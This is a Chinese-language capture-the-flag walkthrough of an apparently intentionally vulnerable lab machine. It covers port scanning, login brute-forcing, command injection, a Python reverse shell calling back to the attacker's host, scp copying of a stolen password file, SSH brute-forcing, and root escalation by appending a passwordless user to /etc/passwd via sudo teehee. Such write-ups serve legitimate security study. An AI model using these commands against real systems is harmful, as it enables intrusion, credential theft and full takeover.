# 信息收集
## 主机发现
>nmap -sn 192.168.72.0/24

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412142236334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
## 端口扫描
>nmap -sV -T4 -O -sT -Pn -p- 192.168.72.156 --script vuln

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412143053380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
访问80端口，是一个登陆界面，页面如下
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412143514805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

## 目录扫描
>dirbuster

没有发现其他有价值的目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412164127325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

# 漏洞利用
通过对登陆页面的测试，发现该页面缺少防暴力破解的验证机制
通过页面上的提示，尝试对admin用户进行暴力破解
利用PB的intrude进行暴力破解，添加password为变量
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412164346885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
得到可以用的密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412164459551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
登陆后的页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412164557977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
看上去是一个命令执行的功能页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412164841783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
使用BP截获数据包，发现可以通过改包控制想要执行的命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412164908310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
给查看当前目录文件的命令后使用`;` 拼接一个查看系统版本的命令进行测试
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412165348736.png)
命令执行成功！！！
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412165531295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
可以验证确实存在命令执行漏洞，下来就是希望通过该漏洞获得webshelll
查看系统中存在的可利用工具
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412172406961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
开启端口监听，用于接收webshell
>nc -vlnp 5678

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412172603629.png)
开始尝试使用nc反弹shell，但都失败，后面利用python成功获得shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.72.141",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412172758720.png)
# 提权过程
进入家目录下发现存在三个用户目录，并在jim用户的目录下发现密码文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412184626817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
下来就是需要将靶机中的密码文件传到kali中，这里用SCP来传输
首先在kali上开启ssh服务
>/etc/init.d/shh start

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412185255781.png)
在靶机中执行命令将密码文件传到kali中
>scp ./old-passwords.bak root@192.168.72.146:/root/

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412185516910.png)
在kali中接收到密码文件后，就可以尝试用jim用户对ssh进行暴破
>medusa -M ssh -h 192.168.72.156 -u jim -P old-passwords.bak -t 10
>-t		代表线程数，为提高准确度，避免设置太高

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412190847861.png)
```
jim  jibril04
```
使用ssh登陆
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412191839240.png)
查看用户目录下的文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412192611686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
过了一会收到了一封新邮件提示
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412193316144.png)
查看邮件得到charles的密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412193814321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
```
charles   ^xHhA&hvim0y
```
切换用户成功，并发现`teehee`存在不安全的配置，可以免密码执行root权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412194130353.png)
查看teehee使用方法，发现它可以执行在文件中追加写入操作
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412200102839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
提权思路是可以利用teehee的root权限在passwd中写入一个免密root权限用户
```
echo "www-date::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412200515185.png)

flag合影
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200412200921572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

***
# passwd文件解读
```
root:x:0:0::/home/admin:/bin/bash
[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
```